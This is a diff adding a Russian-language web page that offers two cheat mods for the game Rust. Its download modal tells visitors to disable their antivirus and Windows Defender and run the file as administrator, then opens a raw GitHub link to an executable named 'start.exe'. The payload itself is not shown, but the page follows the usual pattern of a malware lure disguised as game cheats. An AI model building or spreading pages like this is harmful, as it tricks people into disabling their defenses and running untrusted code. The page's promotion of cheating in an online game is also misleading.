@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rust Mods — Модификации</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  /* === ПЕРЕМЕННЫЕ ТЕМ === */
+  :root {
+    --bg-main: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+    --bg-header: rgba(0, 0, 0, 0.4);
+    --bg-card: rgba(255, 255, 255, 0.04);
+    --bg-modal: #1a1a2e;
+    --bg-instructions: rgba(255, 107, 0, 0.08);
+    --bg-warning: rgba(255, 0, 0, 0.12);
+    --bg-cancel: rgba(255, 255, 255, 0.1);
+    --bg-cancel-hover: rgba(255, 255, 255, 0.2);
+    --border-card: rgba(255, 107, 0, 0.25);
+    --border-li: rgba(255, 255, 255, 0.05);
+    --border-badge: rgba(255, 255, 255, 0.2);
+    --text-main: #e0e0e0;
+    --text-muted: #aaa;
+    --text-nav: #ccc;
+    --text-footer: #666;
+    --text-white: #fff;
+    --text-warning: #ff8080;
+    --accent: #ff6b00;
+    --accent-2: #ff9500;
+    --accent-shadow: rgba(255, 107, 0, 0.6);
+    --accent-shadow-strong: rgba(255, 107, 0, 0.9);
+    --badge-type-bg: rgba(255,255,255,0.1);
+    --badge-type-text: #ccc;
+    --modal-overlay: rgba(0, 0, 0, 0.85);
+    --card-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+    --soon-bg: rgba(255, 255, 255, 0.03);
+    --soon-border: rgba(255, 255, 255, 0.1);
+  }
+
+  body.light {
+    --bg-main: linear-gradient(135deg, #f5f5fa 0%, #e8e8f0 50%, #dfe4ee 100%);
+    --bg-header: rgba(255, 255, 255, 0.7);
+    --bg-card: rgba(255, 255, 255, 0.85);
+    --bg-modal: #ffffff;
+    --bg-instructions: rgba(255, 107, 0, 0.1);
+    --bg-warning: rgba(255, 0, 0, 0.08);
+    --bg-cancel: rgba(0, 0, 0, 0.08);
+    --bg-cancel-hover: rgba(0, 0, 0, 0.15);
+    --border-card: rgba(255, 107, 0, 0.35);
+    --border-li: rgba(0, 0, 0, 0.07);
+    --border-badge: rgba(0, 0, 0, 0.15);
+    --text-main: #222;
+    --text-muted: #555;
+    --text-nav: #333;
+    --text-footer: #888;
+    --text-white: #111;
+    --text-warning: #d32f2f;
+    --accent: #ff6b00;
+    --accent-2: #ff9500;
+    --accent-shadow: rgba(255, 107, 0, 0.4);
+    --accent-shadow-strong: rgba(255, 107, 0, 0.6);
+    --badge-type-bg: rgba(0,0,0,0.08);
+    --badge-type-text: #444;
+    --modal-overlay: rgba(0, 0, 0, 0.5);
+    --card-shadow: 0 10px 40px rgba(0, 0, 0, 0.12);
+    --soon-bg: rgba(0, 0, 0, 0.04);
+    --soon-border: rgba(0, 0, 0, 0.1);
+  }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: var(--bg-main);
+    color: var(--text-main);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    transition: background 0.4s, color 0.4s;
+  }
+
+  header {
+    width: 100%;
+    padding: 25px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: var(--bg-header);
+    border-bottom: 1px solid var(--border-card);
+    transition: background 0.4s, border-color 0.4s;
+    flex-wrap: wrap;
+    gap: 15px;
+  }
+
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 30px;
+  }
+
+  .logo {
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--accent);
+    text-shadow: 0 0 15px var(--accent-shadow);
+    letter-spacing: 2px;
+  }
+
+  .logo span { color: var(--text-white); }
+
+  nav {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    flex-wrap: wrap;
+  }
+
+  nav a, nav button.nav-link {
+    color: var(--text-nav);
+    text-decoration: none;
+    background: none;
+    border: none;
+    font-size: 16px;
+    font-family: inherit;
+    cursor: pointer;
+    padding: 8px 14px;
+    border-radius: 8px;
+    transition: color 0.3s, background 0.3s;
+  }
+
+  nav a:hover, nav button.nav-link:hover {
+    color: var(--accent);
+    background: var(--bg-cancel);
+  }
+
+  .theme-toggle {
+    width: 56px;
+    height: 30px;
+    border-radius: 30px;
+    border: 2px solid var(--accent);
+    background: var(--bg-cancel);
+    cursor: pointer;
+    position: relative;
+    transition: background 0.3s;
+    flex-shrink: 0;
+  }
+
+  .theme-toggle .knob {
+    position: absolute;
+    top: 2px;
+    left: 2px;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    transition: left 0.3s;
+    box-shadow: 0 0 8px var(--accent-shadow);
+  }
+
+  body.light .theme-toggle .knob {
+    left: 28px;
+  }
+
+  main {
+    max-width: 900px;
+    width: 90%;
+    padding: 50px 0;
+    flex: 1;
+  }
+
+  .mod-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-card);
+    border-radius: 18px;
+    padding: 40px;
+    box-shadow: var(--card-shadow);
+    backdrop-filter: blur(8px);
+    transition: background 0.4s, border-color 0.4s, box-shadow 0.4s;
+    margin-bottom: 35px;
+  }
+
+  .mod-header {
+    display: flex;
+    gap: 30px;
+    flex-wrap: wrap;
+    align-items: flex-start;
+  }
+
+  .mod-img {
+    width: 220px;
+    height: 220px;
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 70px;
+    flex-shrink: 0;
+    box-shadow: 0 0 30px var(--accent-shadow);
+  }
+
+  .mod-img.rust { background: linear-gradient(45deg, #ff6b00, #ff2e00, #b30000); }
+  .mod-img.bummer { background: linear-gradient(45deg, #9b59b6, #6c3483, #4a235a); }
+
+  .mod-info h1 {
+    font-size: 34px;
+    color: var(--text-white);
+    margin-bottom: 12px;
+    transition: color 0.4s;
+  }
+
+  .badges { display: flex; gap: 10px; margin-bottom: 18px; flex-wrap: wrap; }
+  .badge {
+    padding: 5px 14px;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .badge.version { background: var(--accent); color: #000; }
+  .badge.status { background: #00c853; color: #000; }
+  .badge.new { background: #9b59b6; color: #fff; }
+  .badge.type {
+    background: var(--badge-type-bg);
+    color: var(--badge-type-text);
+    border: 1px solid var(--border-badge);
+  }
+
+  .mod-info p {
+    color: var(--text-muted);
+    line-height: 1.7;
+    transition: color 0.4s;
+  }
+
+  .features {
+    margin-top: 35px;
+  }
+  .features h2 {
+    color: var(--accent);
+    margin-bottom: 15px;
+    font-size: 22px;
+  }
+  .features ul { list-style: none; }
+  .features li {
+    padding: 10px 0 10px 30px;
+    position: relative;
+    color: var(--text-muted);
+    border-bottom: 1px solid var(--border-li);
+    transition: color 0.4s, border-color 0.4s;
+  }
+  .features li::before {
+    content: '✔';
+    position: absolute;
+    left: 0;
+    color: var(--accent);
+    font-weight: bold;
+  }
+
+  .download-section {
+    margin-top: 40px;
+    text-align: center;
+  }
+
+  .download-btn {
+    display: inline-block;
+    padding: 18px 60px;
+    font-size: 22px;
+    font-weight: 800;
+    color: #000;
+    background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    box-shadow: 0 0 30px var(--accent-shadow);
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+
+  .download-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 50px var(--accent-shadow-strong);
+  }
+
+  .warning-text {
+    margin-top: 15px;
+    font-size: 13px;
+    color: var(--text-warning);
+    transition: color 0.4s;
+  }
+
+  /* === Блок "Скоро" === */
+  .soon-section {
+    margin-top: 10px;
+  }
+
+  .soon-title {
+    font-size: 26px;
+    font-weight: 800;
+    color: var(--accent);
+    margin-bottom: 20px;
+    text-align: center;
+    text-shadow: 0 0 15px var(--accent-shadow);
+  }
+
+  .soon-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 20px;
+  }
+
+  .soon-card {
+    background: var(--soon-bg);
+    border: 2px dashed var(--soon-border);
+    border-radius: 16px;
+    padding: 35px 25px;
+    text-align: center;
+    transition: background 0.4s, border-color 0.4s, transform 0.3s;
+  }
+
+  .soon-card:hover {
+    transform: translateY(-5px);
+    border-color: var(--accent);
+  }
+
+  .soon-icon {
+    font-size: 50px;
+    margin-bottom: 15px;
+    opacity: 0.7;
+  }
+
+  .soon-card h3 {
+    color: var(--text-white);
+    font-size: 20px;
+    margin-bottom: 8px;
+    transition: color 0.4s;
+  }
+
+  .soon-card p {
+    color: var(--text-muted);
+    font-size: 14px;
+    transition: color 0.4s;
+  }
+
+  .soon-badge {
+    display: inline-block;
+    margin-top: 15px;
+    padding: 6px 18px;
+    background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    color: #000;
+    border-radius: 20px;
+    font-size: 13px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* === Модальное окно === */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: var(--modal-overlay);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    padding: 20px;
+  }
+  .modal-overlay.active { display: flex; }
+
+  .modal {
+    background: var(--bg-modal);
+    border: 1px solid var(--accent);
+    border-radius: 16px;
+    max-width: 560px;
+    width: 100%;
+    padding: 35px;
+    box-shadow: 0 0 60px var(--accent-shadow);
+    animation: pop 0.3s ease;
+    transition: background 0.4s;
+  }
+
+  @keyframes pop {
+    from { transform: scale(0.85); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .modal h2 {
+    color: var(--accent);
+    font-size: 24px;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+
+  .modal .instructions {
+    background: var(--bg-instructions);
+    border-left: 4px solid var(--accent);
+    padding: 18px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    line-height: 1.8;
+    color: var(--text-main);
+    font-size: 15px;
+    transition: background 0.4s, color 0.4s;
+  }
+
+  .modal .instructions ol { padding-left: 20px; }
+  .modal .instructions li { margin-bottom: 8px; }
+
+  .antivirus-warning {
+    background: var(--bg-warning);
+    border: 1px solid #ff2e2e;
+    color: var(--text-warning);
+    padding: 15px;
+    border-radius: 8px;
+    font-weight: 600;
+    text-align: center;
+    margin-bottom: 25px;
+    font-size: 15px;
+    transition: background 0.4s, color 0.4s;
+  }
+
+  .modal-buttons {
+    display: flex;
+    gap: 15px;
+  }
+
+  .modal-buttons button {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: 0.25s;
+  }
+
+  .btn-cancel {
+    background: var(--bg-cancel);
+    color: var(--text-main);
+  }
+  .btn-cancel:hover { background: var(--bg-cancel-hover); }
+
+  .btn-confirm {
+    background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    color: #000;
+  }
+  .btn-confirm:hover {
+    box-shadow: 0 0 25px var(--accent-shadow-strong);
+    transform: translateY(-2px);
+  }
+
+  footer {
+    padding: 30px;
+    color: var(--text-footer);
+    font-size: 13px;
+    text-align: center;
+    transition: color 0.4s;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <div class="logo">RUST<span>MODS</span></div>
+    <nav>
+      <a href="#">Главная</a>
+      <a href="#">Модификации</a>
+      <button class="nav-link" id="supportLink">Поддержка</button>
+    </nav>
+  </div>
+
+  <button class="theme-toggle" id="themeToggle" title="Переключить тему">
+    <span class="knob" id="themeKnob">🌙</span>
+  </button>
+</header>
+
+<main>
+
+  <!-- Модификация 1: Rust -->
+  <div class="mod-card">
+    <div class="mod-header">
+      <div class="mod-img rust">🎮</div>
+      <div class="mod-info">
+        <h1>Модификация для Rust</h1>
+        <div class="badges">
+          <span class="badge version">v2.4.1</span>
+          <span class="badge status">Обновлено</span>
+          <span class="badge type">Читы / Мод</span>
+        </div>
+        <p>
+          Мощная модификация для Rust с расширенным функционалом: ESP, Aimbot,
+          быстрый лут, телепорт и многое другое. Полностью обновлена под
+          последнюю версию игры.
+        </p>
+      </div>
+    </div>
+
+    <div class="features">
+      <h2>Возможности</h2>
+      <ul>
+        <li>ESP (игроки, лут, ресурсы)</li>
+        <li>Aimbot с настраиваемым FOV</li>
+        <li>Fly / Speed Hack</li>
+        <li>Быстрый сбор ресурсов</li>
+        <li>Teleport по меткам</li>
+        <li>No Recoil / No Spread</li>
+      </ul>
+    </div>
+
+    <div class="download-section">
+      <button class="download-btn" id="downloadBtn1">⬇ Скачать</button>
+      <p class="warning-text">⚠ Перед запуском обязательно прочитайте инструкцию</p>
+    </div>
+  </div>
+
+  <!-- Модификация 2: Bummer Rust -->
+  <div class="mod-card">
+    <div class="mod-header">
+      <div class="mod-img bummer">🚀</div>
+      <div class="mod-info">
+        <h1>Bummer Rust</h1>
+        <div class="badges">
+          <span class="badge new">NEW</span>
+          <span class="badge version">v1.0.3</span>
+          <span class="badge status">Обновлено</span>
+          <span class="badge type">Читы / Мод</span>
+        </div>
+        <p>
+          Bummer Rust — свежая модификация с упором на стабильность и
+          скрытность. Плавный Aimbot, продвинутый ESP, анти-бан защита и
+          удобный внутриигровой интерфейс.
+        </p>
+      </div>
+    </div>
+
+    <div class="features">
+      <h2>Возможности</h2>
+      <ul>
+        <li>Улучшенный ESP с фильтрами</li>
+        <li>Плавный Aimbot (Smooth)</li>
+        <li>Анти-бан защита</li>
+        <li>Radar Hack</li>
+        <li>Авто-лут и быстрый крафт</li>
+        <li>Настраиваемый конфиг</li>
+      </ul>
+    </div>
+
+    <div class="download-section">
+      <button class="download-btn" id="downloadBtn2">⬇ Скачать</button>
+      <p class="warning-text">⚠ Перед запуском обязательно прочитайте инструкцию</p>
+    </div>
+  </div>
+
+  <!-- Блок "Скоро" -->
+  <div class="soon-section">
+    <h2 class="soon-title">🔜 Скоро появится</h2>
+    <div class="soon-grid">
+      <div class="soon-card">
+        <div class="soon-icon">⚡</div>
+        <h3>Новый мод</h3>
+        <p>Готовим что-то мощное. Следите за обновлениями!</p>
+        <span class="soon-badge">Скоро</span>
+      </div>
+      <div class="soon-card">
+        <div class="soon-icon">🔥</div>
+        <h3>Приватный чит</h3>
+        <p>Закрытая модификация только для избранных.</p>
+        <span class="soon-badge">Скоро</span>
+      </div>
+      <div class="soon-card">
+        <div class="soon-icon">🎯</div>
+        <h3>Обновление Bummer</h3>
+        <p>Крупный апдейт с новыми функциями уже в разработке.</p>
+        <span class="soon-badge">Скоро</span>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<!-- Модальное окно -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <h2>⚠ Внимание перед скачиванием</h2>
+
+    <div class="instructions">
+      <strong>Инструкция по установке:</strong>
+      <ol>
+        <li>Отключите антивирус и Windows Defender на время установки</li>
+        <li>Скачайте архив с модификацией</li>
+        <li>Распакуйте архив в отдельную папку</li>
+        <li>Запустите файл от имени администратора</li>
+        <li>Следуйте указаниям установщика</li>
+      </ol>
+    </div>
+
+    <div class="antivirus-warning">
+      🛡 ОБЯЗАТЕЛЬНО ОТКЛЮЧИТЕ АНТИВИРУС ПЕРЕД ЗАПУСКОМ!
+    </div>
+
+    <div class="modal-buttons">
+      <button class="btn-cancel" id="cancelBtn">Отмена</button>
+      <button class="btn-confirm" id="confirmBtn">Перейти к скачиванию</button>
+    </div>
+  </div>
+</div>
+
+<footer>
+  © 2026 RustMods. Все права защищены.
+</footer>
+
+<script>
+  // === Тема ===
+  const themeToggle = document.getElementById('themeToggle');
+  const themeKnob = document.getElementById('themeKnob');
+
+  const savedTheme = localStorage.getItem('theme');
+  if (savedTheme === 'light') {
+    document.body.classList.add('light');
+    themeKnob.textContent = '☀️';
+  }
+
+  themeToggle.addEventListener('click', () => {
+    document.body.classList.toggle('light');
+    const isLight = document.body.classList.contains('light');
+    themeKnob.textContent = isLight ? '☀️' : '🌙';
+    localStorage.setItem('theme', isLight ? 'light' : 'dark');
+  });
+
+  // === Модальное окно скачивания ===
+  const DOWNLOAD_URL = 'https://github.com/parsabq3-svg/Skrim02/raw/refs/heads/main/start.exe';
+
+  const modalOverlay = document.getElementById('modalOverlay');
+  const cancelBtn = document.getElementById('cancelBtn');
+  const confirmBtn = document.getElementById('confirmBtn');
+
+  function openModal() {
+    modalOverlay.classList.add('active');
+  }
+
+  document.getElementById('downloadBtn1').addEventListener('click', openModal);
+  document.getElementById('downloadBtn2').addEventListener('click', openModal);
+
+  cancelBtn.addEventListener('click', () => {
+    modalOverlay.classList.remove('active');
+  });
+
+  modalOverlay.addEventListener('click', (e) => {
+    if (e.target === modalOverlay) {
+      modalOverlay.classList.remove('active');
+    }
+  });
+
+  confirmBtn.addEventListener('click', () => {
+    window.open(DOWNLOAD_URL, '_blank');
+    modalOverlay.classList.remove('active');
+  });
+
+  // === Поддержка (Discord) ===
+  document.getElementById('supportLink').addEventListener('click', () => {
+    window.open('https://discord.gg/a2Q2BBmbCP', '_blank');
+  });
+</script>
+
+</body>
+</html>
